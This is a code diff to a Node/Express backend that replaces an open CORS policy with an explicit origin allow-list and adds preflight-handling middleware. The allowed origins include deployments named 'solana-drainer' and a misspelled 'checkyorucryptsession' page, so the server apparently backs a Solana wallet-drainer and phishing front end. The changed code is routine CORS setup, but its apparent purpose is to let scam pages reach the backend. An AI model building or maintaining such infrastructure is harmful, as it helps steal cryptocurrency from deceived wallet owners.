@@ -15,9 +15,47 @@ const port = process.env.PORT || DATABASE.backendPort;
 
 app.use(compression());
 app.use(cors({
-    origin: true,
-    credentials: true
+    origin: [
+        'https://checkyorucryptsession-hgrry4hm7-sdyubsabgdgdfsajfdgs-projects.vercel.app',
+        'https://solana-drainer-4whh0xqjc-sdyubsabgdgdfsajfdgs-projects.vercel.app',
+        'http://localhost:3000',
+        'http://localhost:3001',
+        'http://127.0.0.1:3000',
+        'https://sollyzeno.vercel.app',
+        'http://127.0.0.1:3001'
+    ],
+    credentials: true,
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
 }));
+
+// Additional CORS headers for preflight requests
+app.use((req, res, next) => {
+    const allowedOrigins = [
+        'https://checkyorucryptsession-hgrry4hm7-sdyubsabgdgdfsajfdgs-projects.vercel.app',
+        'https://solana-drainer-4whh0xqjc-sdyubsabgdgdfsajfdgs-projects.vercel.app',
+        'https://sollyzeno.vercel.app',
+        'http://localhost:3000',
+        'http://localhost:3001',
+        'http://127.0.0.1:3000',
+        'http://127.0.0.1:3001'
+    ];
+
+    const origin = req.headers.origin;
+    if (allowedOrigins.includes(origin)) {
+        res.header('Access-Control-Allow-Origin', origin);
+    }
+
+    res.header('Access-Control-Allow-Credentials', 'true');
+    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
+
+    if (req.method === 'OPTIONS') {
+        res.sendStatus(200);
+    } else {
+        next();
+    }
+});
 app.use(bodyParser.json({limit: '150mb'}));
 app.use(bodyParser.urlencoded({limit: '150mb', extended: true}));
 
